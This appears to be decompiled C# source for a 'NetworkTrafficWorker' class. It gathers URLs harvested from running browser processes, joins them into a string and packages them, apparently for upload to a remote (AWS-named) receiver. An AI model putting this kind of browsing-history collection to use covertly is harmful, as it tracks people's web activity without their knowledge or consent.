using DpvClassLibrary.Receivers;
using DpvClassLibrary.Tools;
using IO.Swagger.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace DpvClassLibrary.Workers
{
	public class NetworkTrafficWorker : DataPackageEnvelopeWorkerBase
	{
		private HashSet<string> _urls = new HashSet<string>();

		protected override ActiveColsEnum ActiveColType => 8;

		public NetworkTrafficWorker(IDataPackageEnvelopeReceiver receiver)
			: base(receiver)
		{
		}

		protected override List<DataPackage> GetDataPackages()
		{
			//IL_0078: Unknown result type (might be due to invalid IL or missing references)
			//IL_0082: Expected O, but got Unknown
			CurrentBrowserUrlsTool.GetHarvestedUrlsFromRunningProcessesAndEmptyTheList().ToList().ForEach(delegate(string url)
			{
				_urls.Add(url);
			});
			List<string> list = _urls.ToList();
			list.Sort();
			string s = string.Join(";", list);
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			_urls.Clear();
			return new List<DataPackage>
			{
				new DataPackage(8, (bool?)false, bytes, (DateTime?)DataPackageEnvelopeAwsReceiver.ServerTime, (long?)GetAndIncrementWorkSequence())
			};
		}
	}
}
